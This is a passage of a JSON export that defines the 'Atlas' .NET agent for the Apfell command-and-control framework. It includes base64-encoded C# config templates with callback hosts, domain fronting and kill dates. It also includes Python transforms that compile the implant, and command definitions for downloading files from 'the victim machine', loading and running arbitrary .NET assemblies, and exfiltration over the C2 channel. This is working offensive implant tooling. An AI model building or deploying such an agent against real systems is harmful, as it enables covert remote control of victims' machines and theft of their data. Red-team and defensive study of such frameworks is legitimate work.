GVyc1tqXVsnbmFtZSddXSArICInPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgICBlbHNlewogICAgICAgIG91dHB1dCArPSAiPHRkIHN0eWxlPSdwYWRkaW5nOjBweCAwcHggMHB4IDIwcHgnPiIgKyBkYXRhW2ldW2hlYWRlcnNbal1bJ25hbWUnXV0gKyAiPC90ZD4iOwogICAgIH0KICAgIH0KICAgIG91dHB1dCArPSAiPC90cj4iOwogIH0KICBvdXRwdXQgKz0gIjwvdGFibGU+IjsKICByZXR1cm4gb3V0cHV0Owp9"
        },
        {
          "name": "collapsable",
          "script": "ZnVuY3Rpb24oaGVhZGVyLCBlbGVtZW50LCB1bmlxdWVfaWQpewoJLy90YWtlcyBpbiBpbmZvcm1hdGlvbiBhYm91dCB0aGUgaGVhZGVyIHRvIG1ha2UgYW5kIHRoZSBlbGVtZW50IHRvIGNvbGxhcHNlIHdpdGhpbiBpdCAoYXMgYSBzdHJpbmcpCgl2YXIgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPjxhIGNsYXNzPSdidG4nIHR5cGU9J2J1dHRvbicgZGF0YS10b2dnbGU9J2NvbGxhcHNlJyBkYXRhLXRhcmdldD0nI2JzdGFzayIgKyB1bmlxdWVfaWQgKyAiJyBhcmlhLWV4cGFuZGVkPSdmYWxzZScgYXJpYS1jb250cm9scz0nYnN0YXNrIiArIHVuaXF1ZV9pZCArICInPiIrIGhlYWRlclsnbmFtZSddICsgIjwvYT48L2Rpdj4iOwogICAgICBvdXRwdXQgKz0gIjxkaXYgY2xhc3M9J2NvbGxhcHNlJyBpZD1cImJzdGFzayIgKyB1bmlxdWVfaWQgKyAiXCIgc3R5bGU9J3dpZHRoOjEwMCUnPiI7CiAgICAgIG91dHB1dCArPSAiPGRpdiBjbGFzcz0nYmctY2FyZC1ib2R5LWwyIGNhcmQtYm9keSBib3JkZXIgYm9yZGVyLWRhcmsgc2hhZG93Jz4iICsgZWxlbWVudCArICI8L2Rpdj48L2Rpdj48L2Rpdj4iOwogIHJldHVybiBvdXRwdXQ7Cn0="
        }
      ],
      "c2_profiles": {
        "default": [
          {
            "Config_temp.cs": "dXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7Cm5hbWVzcGFjZSBBdGxhcwp7CiAgICBwdWJsaWMgY2xhc3MgQ29uZmlnCiAgICB7CiAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gQ2FsbGJhY2tIb3N0cyA9IG5ldyBMaXN0PHN0cmluZz4geyAiY2FsbGJhY2tfaG9zdDpjYWxsYmFja19wb3J0IiB9OwogICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxVdGlscy5TZXJ2ZXI+IFNlcnZlcnMgPSBuZXcgTGlzdDxVdGlscy5TZXJ2ZXI+IHsgfTsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXlsb2FkVVVJRCA9ICIlVVVJRCUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFVVSUQgPSAiIjsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVc2VyQWdlbnQgPSAiVVNFUl9BR0VOVCI7CiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgSG9zdEhlYWRlciA9ICJkb21haW5fZnJvbnQiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgaW50IFNsZWVwID0gY2FsbGJhY2tfaW50ZXJ2YWw7CiAgICAgICAgcHVibGljIHN0YXRpYyBpbnQgSml0dGVyID0gY2FsbGJhY2tfaml0dGVyOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEtpbGxEYXRlID0gImtpbGxkYXRlIjsKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXJhbSA9ICIlUEFSQU0lIjsKICAgICAgICBwdWJsaWMgY29uc3QgaW50IENodW5rU2l6ZSA9ICVDSFVOS19TSVpFJTsKICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgRGVmYXVsdFByb3h5ID0gJURFRkFVTFRfUFJPWFklOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5QWRkcmVzcyA9ICIlUFJPWFlfQUREUkVTUyUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5VXNlciA9ICIlUFJPWFlfVVNFUiUiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFByb3h5UGFzc3dvcmQgPSAiJVBST1hZX1BBU1NXT1JEJSI7CiNpZiAoREVGQVVMVCB8fCBERUZVTEFUX1BTSyB8fCBERUZBVUxUX0VLRSkKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVcmwgPSAiL2FwaS92MS40L2FnZW50X21lc3NhZ2UiOwojZW5kaWYKI2lmIChEZWZhdWx0X1BTSyB8fCBERUZBVUxUX0VLRSkKICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQc2sgPSAiQUVTUFNLIjsKI2VuZGlmCiNpZiBERUZBVUxUX0VLRQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFNlc3Npb25JZCA9ICIiOwogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIHRlbXBVVUlEID0gIiI7CiAgICAgICAgcHVibGljIHN0YXRpYyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJTQUNyeXB0b1NlcnZpY2VQcm92aWRlciBSc2E7CiNlbmRpZgogICAgICAgIHB1YmxpYyBzdGF0aWMgRGljdGlvbmFyeTxzdHJpbmcsIHN0cmluZz4gTW9kdWxlcyA9IG5ldyBEaWN0aW9uYXJ5PHN0cmluZywgc3RyaW5nPigpOwogICAgfQp9"
          }
        ]
      },
      "load_transforms": [],
      "create_transforms": [
        {
          "parameter": "",
          "description": "",
          "transform": "atlas_stamp_parameters",
          "parameter_type": "None",
          "order": 10
        },
        {
          "parameter": "",
          "description": "Compile Atlas payload",
          "transform": "atlas_compile_and_return",
          "parameter_type": "None",
          "order": 11
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the username to use to authenticate to the proxy server",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 9
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the password to use to authenticate to the proxy server",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 8
        },
        {
          "parameter": "",
          "description": "(Optional) Specify the proxy address to use for web requests ",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 7
        },
        {
          "parameter": "4.0\n3.5",
          "description": "",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 1
        },
        {
          "parameter": "true\nfalse",
          "description": "True will use the system's default proxy settings, false will use proxy settings specify below",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 6
        },
        {
          "parameter": "512000",
          "description": "Specify the chunking size to use for download\/upload and command output",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 5
        },
        {
          "parameter": "id",
          "description": "Specify the query parameter to use for GET requests",
          "transform": "save_string_parameter",
          "parameter_type": "String",
          "order": 4
        },
        {
          "parameter": "DEFAULT_EKE\nDEFAULT_PSK\nDEFAULT",
          "description": "Profile\/encryption to use",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 3
        },
        {
          "parameter": "x64\nx86\nanycpu",
          "description": "Architecture to target when compiling",
          "transform": "save_parameter",
          "parameter_type": "ChooseOne",
          "order": 2
        }
      ],
      "transforms": [
        {
          "code": "YXN5bmMgZGVmIHN3YXBfc2hvcnRuYW1lcyhzZWxmLCB0YXNrX3BhcmFtczogc3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICAjIHNldHMgYSBmbGFnIHRvIHN3YXAgcGFyYW1ldGVycyB0aGF0IGVuZCBpbiBfaWQgd2l0aCBmaWxlbmFtZXMgaWYgdGhlIGN1cnJlbnQgdmFsdWUgZXhpc3RzIGFzIGEgZmlsZSBuYW1lDQogICAgaW1wb3J0IGpzb24NCiAgICB0cnk6DQogICAgICAgIHBhcmFtcyA9IGpzb24ubG9hZHModGFza19wYXJhbXMpDQogICAgICAgIHBhcmFtc1snc3dhcF9zaG9ydG5hbWVzJ10gPSBUcnVlDQogICAgICAgIHJldHVybiBqc29uLmR1bXBzKHBhcmFtcykNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIHByaW50KCJjYW4ndCBhZGQgc3dhcF9zaG9ydG5hbWVzIGZpZWxkIHNpbmNlIGl0J3Mgbm90IGpzb24iKQ0KICAgIHJldHVybiB0YXNrX3BhcmFtcw==",
          "name": "swap_shortnames",
          "parameter_type": "None",
          "description": "Swap *_id parameter filename to corresponding file_id",
          "is_command_code": true,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 2,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX2xvYWRhc3NlbWJseV9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGlmIGxlbih0YXNrX3BhcmFtcykgPT0gMDoNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJNaXNzaW5nIHBhcmFtZXRlcnMiKQ0KICAgIGlmIHRhc2tfcGFyYW1zWzBdID09ICJ7IjoNCiAgICAgICAgdGFza19kaWN0ID0ganNvbi5sb2Fkcyh0YXNrX3BhcmFtcykNCiAgICAgICAgdGFza19kaWN0WydyZW1vdGVfcGF0aCddID0gJycNCiAgICAgICAgcmV0dXJuIGpzb24uZHVtcHModGFza19kaWN0LCBzb3J0X2tleXM9VHJ1ZSkNCiAgICB0YXNrX2RpY3QgPSB7ImFzc2VtYmx5X2lkIjogdGFza19wYXJhbXMsICJyZW1vdGVfcGF0aCI6ICIifQ0KICAgIHJldHVybiBqc29uLmR1bXBzKHRhc2tfZGljdCk=",
          "name": "atlas_loadassembly_shorthand",
          "parameter_type": "None",
          "description": "Swap out filenames for needed file_id",
          "is_command_code": true,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 1,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX3VwbG9hZF9zaG9ydGhhbmQoc2VsZiwgdGFza19wYXJhbXM6c3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoNCiAgICBpbXBvcnQganNvbg0KICAgIGlmIGxlbih0YXNrX3BhcmFtcykgPT0gMDoNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJNaXNzaW5nIHBhcmFtZXRlcnMiKQ0KICAgIGlmIHRhc2tfcGFyYW1zWzBdID09ICJ7IjoNCiAgICAgICAgcmV0dXJuIHRhc2tfcGFyYW1zDQogICAgcGllY2VzID0gdGFza19wYXJhbXMuc3BsaXQoIiAiKQ0KICAgIHRhc2tfZGljdCA9IHsiYXNzZW1ibHlfaWQiOiBwaWVjZXNbMF0sICJyZW1vdGVfcGF0aCI6ICcgJy5qb2luKHBpZWNlc1sxOl0pfQ0KICAgIHJldHVybiBqc29uLmR1bXBzKHRhc2tfZGljdCk=",
          "name": "atlas_upload_shorthand",
          "parameter_type": "None",
          "description": "Swap out filename for needed file_id",
          "is_command_code": true,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 3,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX3J1bmFzc2VtYmx5X3Nob3J0aGFuZChzZWxmLCB0YXNrX3BhcmFtczpzdHIsIHBhcmFtZXRlcjogTm9uZSkgLT4gc3RyOg0KICAgIGltcG9ydCBqc29uDQogICAgaWYgbGVuKHRhc2tfcGFyYW1zKSA9PSAwOg0KICAgICAgICByYWlzZSBFeGNlcHRpb24oIk1pc3NpbmcgcGFyYW1ldGVycyIpDQogICAgaWYgdGFza19wYXJhbXNbMF0gPT0gInsiOg0KICAgICAgICByZXR1cm4gdGFza19wYXJhbXMNCiAgICBwaWVjZXMgPSB0YXNrX3BhcmFtcy5zcGxpdCgiICIpDQogICAgdGFza19kaWN0ID0geyJhc3NlbWJseV9pZCI6IHBpZWNlc1swXSwgImFyZ3MiOiAiICIuam9pbihwaWVjZXNbMTpdKX0NCiAgICByZXR1cm4ganNvbi5kdW1wcyh0YXNrX2RpY3Qp",
          "name": "atlas_runassembly_shorthand",
          "parameter_type": "None",
          "description": "Swap out filename for needed file_id",
          "is_command_code": true,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 4,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX3N0YW1wX3BhcmFtZXRlcnMoc2VsZiwgcHJpb3Jfb3V0cHV0OiBOb25lLCBwYXJhbWV0ZXI6IHN0cikgLT4gYnl0ZWFycmF5OgogICAgaWYgbGVuKHNlbGYuc2F2ZWRfYXJyYXkpIDwgNjoKICAgICAgICByYWlzZSBFeGNlcHRpb24oIkluY29ycmVjdCBudW1iZXIgb2Ygc2F2ZWQgYXJndW1lbnRzIikKICAgIHV1aWQgPSBvcGVuKCJ7fS9VdWlkLnR4dCIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTEgPSBvcGVuKCJ7fS9Db25maWdfdGVtcC5jcyIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpLCAncicpLnJlYWQoKQogICAgZmlsZTIgPSBvcGVuKCJ7fS9Db25maWcuY3MiLmZvcm1hdChzZWxmLndvcmtpbmdfZGlyKSwgJ3cnKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCIlVVVJRCUiLCB1dWlkLnN0cmlwKCkpCiAgICBpZiBzZWxmLnNhdmVkX2FycmF5WzNdIGlzIG5vdCBOb25lIGFuZCBzZWxmLnNhdmVkX2FycmF5WzNdIGlzIG5vdCAiIjoKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVQQVJBTSUnLCBzZWxmLnNhdmVkX2FycmF5WzNdKQogICAgZWxzZToKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVQQVJBTSUnLCAnaWQnKQogICAgaWYgc2VsZi5zYXZlZF9hcnJheVs0XSBpcyBub3QgTm9uZSBhbmQgc2VsZi5zYXZlZF9hcnJheVs0XSBpcyBub3QgIiI6CiAgICAgICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclQ0hVTktfU0laRSUnLCBzZWxmLnNhdmVkX2FycmF5WzRdKQogICAgZWxzZToKICAgICAgICBmaWxlMSA9IGZpbGUxLnJlcGxhY2UoJyVDSFVOS19TSVpFJScsIHN0cig1MTIwMDApKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclREVGQVVMVF9QUk9YWSUnLCBzZWxmLnNhdmVkX2FycmF5WzVdKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfQUREUkVTUyUnLCBzZWxmLnNhdmVkX2FycmF5WzZdKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfVVNFUiUnLCBzZWxmLnNhdmVkX2FycmF5WzddKQogICAgZmlsZTEgPSBmaWxlMS5yZXBsYWNlKCclUFJPWFlfUEFTU1dPUkQlJywgc2VsZi5zYXZlZF9hcnJheVs4XSkKICAgIGZpbGUyLndyaXRlKGZpbGUxKQogICAgZmlsZTIuY2xvc2UoKQ==",
          "name": "atlas_stamp_parameters",
          "parameter_type": "None",
          "description": "Stamp in parameters for Atlas payload",
          "is_command_code": false,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 8,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGF0bGFzX2NvbXBpbGVfYW5kX3JldHVybihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBieXRlYXJyYXk6DQogICAgdHJ5Og0KICAgICAgICBpZiBsZW4oc2VsZi5zYXZlZF9hcnJheSkgPCA2Og0KICAgICAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJJbmNvcnJlY3QgbnVtYmVyIG9mIHNhdmVkIGFyZ3VtZW50cyIpDQogICAgICAgIGFyY2ggPSBzZWxmLnNhdmVkX2FycmF5WzFdDQogICAgICAgIHByb2ZpbGUgPSBzZWxmLnNhdmVkX2FycmF5WzJdDQogICAgICAgIGlmIHNlbGYuc2F2ZWRfYXJyYXlbMF0gPT0gIjQuMCI6DQogICAgICAgICAgICBjb21tYW5kID0gIi91c3IvYmluL21jcyAtdGFyZ2V0OndpbmV4ZSAtc2RrOjQgLXBsYXRmb3JtOnt9IC1kZWZpbmU6XCJUUkFDRSx7fVwiIC1vcHRpbWl6ZSsgLW91dDpBdGxhcy5leGUgQ29uZmlnLmNzICBDcnlwdG8uY3MgIEh0dHBfNC4wLmNzIE1vZHVsZXMuY3MgIFByb2dyYW0uY3MgVXRpbHMuY3MiLmZvcm1hdChhcmNoLCBwcm9maWxlKQ0KICAgICAgICBlbGlmIHNlbGYuc2F2ZWRfYXJyYXlbMF0gPT0gIjMuNSI6DQogICAgICAgICAgICBjb21tYW5kID0gIi91c3IvYmluL2dtY3MgL25vY29uZmlnIC9kZWJ1Zy0gL29wdGltaXplKyAvb3V0OkF0bGFzLmV4ZSBDb25maWcuY3MgQ3J5cHRvLmNzIEh0dHBfMy41LmNzIE1vZHVsZXMuY3MgUHJvZ3JhbS5jcyBVdGlscy5jcyAvdGFyZ2V0OndpbmV4ZSAvZGVmaW5lOlRSQUNFLHt9IC9wbGF0Zm9ybTp7fSAvcmVmZXJlbmNlOi91c3IvbGliL21vbm8vMi4wL1N5c3RlbS5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uWG1sLkxpbnEuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLkRhdGEuRGF0YVNldEV4dGVuc2lvbnMuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby9nYWMvTWljcm9zb2Z0LkNTaGFycC80LjAuMC4wX19iMDNmNWY3ZjExZDUwYTNhL01pY3Jvc29mdC5DU2hhcnAuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLkRhdGEuZGxsIC9yZWZlcmVuY2U6L3Vzci9saWIvbW9uby8yLjAvU3lzdGVtLlhtbC5kbGwgL3JlZmVyZW5jZTovdXNyL2xpYi9tb25vLzIuMC9TeXN0ZW0uQ29yZS5kbGwgL3dhcm46NCIuZm9ybWF0KHByb2ZpbGUsIGFyY2gpDQogICAgICAgIHByb2MgPSBhd2FpdCBhc3luY2lvLmNyZWF0ZV9zdWJwcm9jZXNzX3NoZWxsKGNvbW1hbmQsIHN0ZG91dD1hc3luY2lvLnN1YnByb2Nlc3MuUElQRSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGRlcnI9YXN5bmNpby5zdWJwcm9jZXNzLlBJUEUsIGN3ZD1zZWxmLndvcmtpbmdfZGlyKQ0KICAgICAgICBzdGRvdXQsIHN0ZGVyciA9IGF3YWl0IHByb2MuY29tbXVuaWNhdGUoKQ0KICAgICAgICBpZiBzdGRvdXQ6DQogICAgICAgICAgICBwcmludChmJ1tzdGRvdXRdXG57c3Rkb3V0LmRlY29kZSgpfScpDQogICAgICAgIGlmIHN0ZGVycjoNCiAgICAgICAgICAgIHByaW50KGYnW3N0ZGVycl1cbntzdGRlcnIuZGVjb2RlKCl9JykNCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoInt9L0F0bGFzLmV4ZSIuZm9ybWF0KHNlbGYud29ya2luZ19kaXIpKToNCiAgICAgICAgICAgIHJldHVybiBieXRlYXJyYXkob3Blbigie30vQXRsYXMuZXhlIi5mb3JtYXQoc2VsZi53b3JraW5nX2RpciksICdyYicpLnJlYWQoKSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgICMgc29tZXRoaW5nIHdlbnQgd3JvbmcsIHJldHVybiBvdXIgZXJyb3JzDQogICAgICAgICAgICByYWlzZSBFeGNlcHRpb24oc3RkZXJyLmRlY29kZSgpKQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKHN0ZGVyci5kZWNvZGUoKSArIHN0ZG91dC5kZWNvZGUoKSk=",
          "name": "atlas_compile_and_return",
          "parameter_type": "None",
          "description": "Compile atlas payload",
          "is_command_code": false,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 7,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHNhdmVfc3RyaW5nX3BhcmFtZXRlcihzZWxmLCBwcmlvcl9vdXRwdXQ6IE5vbmUsIHBhcmFtZXRlcjogc3RyKSAtPiBOb25lOgogICAgc2VsZi5zYXZlZF9hcnJheS5hcHBlbmQocGFyYW1ldGVyKQogICAgcmV0dXJuIE5vbmU=",
          "name": "save_string_parameter",
          "parameter_type": "String",
          "description": "Save a string parameter to saved_array",
          "is_command_code": false,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 6,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIHNhdmVfcGFyYW1ldGVyKHNlbGYsIHByaW9yX291dHB1dDogTm9uZSwgcGFyYW1ldGVyOiBzdHIpIC0+IE5vbmU6CiAgICBzZWxmLnNhdmVkX2FycmF5LmFwcGVuZChwYXJhbWV0ZXIpCiAgICByZXR1cm4gTm9uZQ==",
          "name": "save_parameter",
          "parameter_type": "ChooseOne",
          "description": "Save a value as the next element in self.saved_array",
          "is_command_code": false,
          "timestamp": "03\/06\/2020 16:21:23",
          "id": 5,
          "operator": "apfell_admin"
        }
      ],
      "commands": [
        {
          "needs_admin": false,
          "help_cmd": "config [info | domain | sleep | jitter | host_header | user_agent | param | proxy] [add | remove | use_default | address | username | password] [options]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "config\t\t\t\tbase command\noptions:\ninfo\t\t\t\tdisplay current agent configuration\ndomain\t\t\t\toption to add\/remove C2 domain\n\tadd\t\t\t\tadd a C2 domain to list of domains\n\tremove\t\t\tremove a C2 domain from list of domains (will not let list be less then one domain)\nsleep\t\t\t\tsleep time between taskings in seconds\njitter\t\t\t\tvariation in sleep time, specify as a percentage\nkill_date\t\t\tdate for agent to exit itself\nhost_header\t\t\thost header to use for domain fronting\nuser_agent\t\t\tuser-agent header for web requests\nparam\t\t\t\toption for query parameter used in GET requests\nproxy\t\t\t\toption to modify proxy settings\n\tuse_default\t\ttrue\/false, choose whether to use system default settings or manual settings specified in config\n\taddress\t\t\taddress of proxy server\n\tusername\t\tusername to authenticate to proxy server\n\tpassword\t\tpassword to authenticate to proxy server\nExamples:\nconfig info\nconfig domain add http:\/\/hello.world\nconfig sleep 60\nconfig jitter 20\nconfig kill_date 2020-03-01\nconfig host_header cdn.cloudfront.com\nconfig user_agent Mozilla 5.0 IE blah blah blah\nconfig param order\nconfig proxy use_default false\nconfig proxy address 192.168.1.100\nconfig proxy username harm.j0y\nconfig proxy password Liv3F0rTh3Tw!ts",
          "cmd": "config",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "download [path to remote file]",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": true,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Download a file from the victim machine to the apfell server in chunks (no need for quotes in the path). It will be saved to app\/files\/{operation name}\/downloads\/{hostname}\/{filename}",
          "cmd": "download",
          "parameters": [
            {
              "type": "String",
              "hint": "Path to remote file to be downloaded",
              "choices": "",
              "required": true,
              "name": "file_path"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "loadassembly [assembly filename]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Load an arbitrary .NET assembly via Assembly.Load and track the assembly FullName to call for execution with the runassembly command. If assembly is loaded through Apfell's services -> host file, then operators can simply specify the filename from the uploaded file",
          "cmd": "loadassembly",
          "parameters": [
            {
              "type": "File",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "loadassembly",
              "command_id": 3,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            },
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "loadassembly",
              "command_id": 3,
              "payload_type": "atlas",
              "transform": "atlas_loadassembly_shorthand",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "upload {\"assembly_id\": 65, \"remote_path\": \"path to file\"}",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Take a file from the database and store it on disk through the callback.",
          "cmd": "upload",
          "parameters": [
            {
              "type": "File",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            },
            {
              "type": "String",
              "hint": "Path to save the remote file too (default is current directory)",
              "choices": "",
              "required": true,
              "name": "remote_path"
            }
          ],
          "attack": [
            {
              "t_num": "T1132",
              "attack_name": "Data Encoding"
            },
            {
              "t_num": "T1030",
              "attack_name": "Data Transfer Size Limits"
            },
            {
              "t_num": "T1041",
              "attack_name": "Exfiltration Over Command and Control Channel"
            }
          ],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "upload",
              "command_id": 4,
              "payload_type": "atlas",
              "transform": "atlas_upload_shorthand",
              "parameter_type": "None"
            },
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "upload",
              "command_id": 4,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "exit",
          "version": 1,
          "is_exit": true,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This exits the current atlas instance by leveraging the Environment.Exit class method.",
          "cmd": "exit",
          "parameters": [],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "runassembly [filename] [assembly arguments]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Execute the entrypoint of a assembly loaded by the loadassembly command and redirect the console output back to the Apfell server.",
          "cmd": "runassembly",
          "parameters": [
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": true,
              "name": "assembly_id"
            },
            {
              "type": "String",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "args"
            }
          ],
          "attack": [],
          "artifacts": [],
          "files": [],
          "transforms": [
            {
              "order": 1,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "runassembly",
              "command_id": 6,
              "payload_type": "atlas",
              "transform": "atlas_runassembly_shorthand",
              "parameter_type": "None"
            },
            {
              "order": 2,
              "parameter": "",
              "active": true,
              "description": "",
              "timestamp": "03\/06\/2020 16:21:23",
              "command": "runassembly",
              "command_id": 6,
              "payload_type": "atlas",
              "transform": "swap_shortnames",
              "parameter_type": "None"
            }
          ]
        },
        {
          "needs_admin": false,
          "help_cmd": "jobkill [job id]",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "*",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "*",
          "is_remove_file": false,
          "remove_file_parameters": "*",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Kills a running job and removes it from the atlas instance's list of running jobs.",
          "cmd": "jobkill",
          "parameters": [
            {
